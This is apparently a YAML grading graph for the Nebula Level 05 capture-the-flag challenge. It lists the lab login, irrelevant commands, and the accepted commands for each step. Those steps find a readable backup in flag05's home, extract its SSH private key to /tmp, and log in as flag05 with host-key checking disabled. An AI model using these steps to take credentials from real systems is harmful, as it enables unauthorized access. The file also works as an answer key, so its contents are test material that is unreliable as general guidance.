version: '0.5'
graph:
  type: reference
challenge:
  id: nebula_level05
  name: Nebula Level 05
  description: Recover SSH material from a weakly protected backup and log in as flag05.
attacker_context:
  user: level05
  access:
    method: ssh
    credentials:
      username: level05
      password: level05
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node2
irrelevant_commands:
- man
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- ls
- cd
- cat
- file
- strings
- ltrace
- strace
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Backup archive identified
- id: node1
  type: state
  label: SSH key extracted
- id: node2
  type: state
  label: Execution as flag05 obtained
edges:
- id: edge0
  from: start
  to: node0
  action: inspect_flag05_backup_directory
  accepted_commands:
  - ls -al /home/flag05/.backup
  - find /home/flag05/.backup -type f 2>/dev/null
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge1
  from: node0
  to: node1
  action: extract_backup_and_recover_private_key
  accepted_commands:
  - tar xzf /home/flag05/.backup/backup-19072011.tgz -C /tmp
  - chmod 600 /tmp/.ssh/id_rsa
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
- id: edge2
  from: node1
  to: node2
  action: ssh_using_recovered_key
  accepted_commands:
  - ssh -i /tmp/.ssh/id_rsa -o StrictHostKeyChecking=no flag05@localhost
  - ssh -i /tmp/.ssh/id_rsa flag05@localhost
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: ^$
